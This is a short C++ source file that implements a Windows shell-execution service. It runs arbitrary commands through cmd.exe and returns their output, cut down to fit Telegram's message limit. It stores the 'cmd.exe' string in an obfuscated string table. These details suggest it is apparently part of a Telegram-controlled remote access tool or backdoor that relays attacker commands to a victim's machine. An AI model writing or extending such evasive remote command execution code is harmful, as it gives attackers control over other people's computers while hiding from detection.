#include "infrastructure/system/WindowsShellService.hpp"

#include <array>
#include <cstdio>
#include <memory>

#include "domain/common/StringTable.hpp"

namespace nuub::infrastructure::system {

std::string WindowsShellService::execute(const std::string& command) {
    // Use encrypted string for cmd.exe
    std::string cmd_exe = domain::StringTable::get("cmd_exe");
    std::string full_cmd = cmd_exe + " /c " + command + " 2>&1";

    std::unique_ptr<FILE, decltype(&_pclose)> pipe(
        _popen(full_cmd.c_str(), "r"), _pclose);

    if (!pipe) return "Error: no se pudo ejecutar el comando.";

    std::array<char, 4096> buffer{};
    std::string result;

    while (fgets(buffer.data(), static_cast<int>(buffer.size()), pipe.get()) != nullptr) {
        result += buffer.data();
    }

    if (result.empty()) {
        result = "(sin salida)";
    }

    // Telegram message limit is 4096 characters
    constexpr size_t MAX_MSG = 4000;
    if (result.size() > MAX_MSG) {
        result.resize(MAX_MSG);
        result += "\n... (truncado)";
    }

    return result;
}

} // namespace nuub::infrastructure::system
